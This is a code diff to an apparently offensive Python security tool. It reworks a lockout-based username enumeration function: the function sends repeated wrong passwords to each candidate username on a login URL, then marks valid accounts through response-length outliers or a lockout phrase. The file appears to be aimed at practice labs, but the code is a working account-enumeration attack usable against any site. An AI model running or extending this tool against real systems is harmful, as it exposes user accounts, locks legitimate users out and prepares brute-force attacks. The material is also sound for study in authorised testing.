@@ -10,6 +10,7 @@ import sys
 import socket
 import ftplib
 import os
+from collections import Counter
 
 try:
     import paramiko
@@ -509,12 +510,22 @@ def username_enum_lockout(url, username_file, lockout_phrase, attempts_per_user,
     Some apps only track failed-attempt counts for usernames that actually
     exist. Hammering a non-existent username with wrong passwords never
     changes the response; hammering a REAL username eventually trips its
-    lockout, and the response changes to a distinct lockout message. That
-    message is the oracle here -- not a fixed-password response difference.
+    lockout, and the response changes -- in length, wording, or both.
 
-    For each candidate username, fires `attempts_per_user` wrong-password
-    attempts in a row, then checks the LAST response for the lockout
-    phrase (falling back to the generic BLOCK_INDICATORS list too).
+    Exact phrase matching is fragile: if the lockout message doesn't match
+    what you typed byte-for-byte (different casing, punctuation, extra
+    whitespace, a slightly different sentence), every username looks
+    identical and nothing gets flagged -- a silent false negative, not a
+    "no valid usernames" result.
+
+    So the primary signal here is RESPONSE LENGTH, the same oracle used for
+    "subtly different responses" labs: across ~100 candidate usernames,
+    the overwhelming majority are invalid and their final (post-attempts)
+    response length will cluster around one common value. Any username
+    whose final response length is an outlier from that majority is
+    almost certainly the one that actually got locked out. The optional
+    lockout_phrase (and the generic BLOCK_INDICATORS list) are kept as a
+    secondary signal, unioned with the length-outlier result.
     """
     print(colored("\n[*] Starting lockout-triggered username enumeration...", 'cyan'))
 
@@ -550,8 +561,11 @@ def username_enum_lockout(url, username_file, lockout_phrase, attempts_per_user,
     print(colored(f"\n[*] Enumeration started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
     print(colored("=" * 55, 'cyan'))
 
-    valid_usernames = []
     wrong_passwords = [f"wrongpass{i}" for i in range(1, attempts_per_user + 1)]
+
+    # Pass 1: hammer every username, record each one's final response
+    # (text for phrase matching, length for outlier analysis).
+    results = []  # list of (username, final_response_text, final_response_length)
 
     for ucount, username in enumerate(usernames, 1):
         last_response_text = ""
@@ -585,13 +599,38 @@ def username_enum_lockout(url, username_file, lockout_phrase, attempts_per_user,
             except requests.exceptions.Timeout:
                 pass
 
-        locked = (lockout_phrase and lockout_phrase in last_response_text) or \
-                 is_blocked_response(last_response_text)
-        if locked:
-            print(colored(f"\n  [!] VALID USERNAME (locked out): {username}", 'green'))
-            valid_usernames.append(username)
+        results.append((username, last_response_text, len(last_response_text)))
 
     print(colored(f"\n\n[*] Enumeration complete at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
+
+    # Pass 2: figure out which usernames are the outliers.
+    lengths = [length for _, _, length in results]
+    length_counts = Counter(lengths)
+    majority_length, majority_count = length_counts.most_common(1)[0]
+
+    print(colored(
+        f"\n[*] Response length analysis: {len(length_counts)} distinct length(s) seen, "
+        f"majority = {majority_length} chars ({majority_count}/{total} usernames)", 'cyan'))
+
+    if len(length_counts) == 1:
+        print(colored(
+            "[!] Every response was exactly the same length -- the length oracle found no "
+            "outlier. Either every username here is genuinely invalid, the lockout never "
+            "triggered (raise --attempts), or the app pads responses to a fixed size.", 'yellow'))
+
+    valid_usernames = []
+    for username, response_text, length in results:
+        length_outlier = length != majority_length
+        phrase_hit = (lockout_phrase and lockout_phrase in response_text) or \
+                     is_blocked_response(response_text)
+        if length_outlier or phrase_hit:
+            reason = []
+            if length_outlier:
+                reason.append(f"length {length} vs majority {majority_length}")
+            if phrase_hit:
+                reason.append("lockout phrase matched")
+            print(colored(f"  [!] VALID USERNAME: {username} ({', '.join(reason)})", 'green'))
+            valid_usernames.append(username)
 
     if valid_usernames:
         print(colored(f"\n[+] Valid usernames found: {valid_usernames}", 'green'))
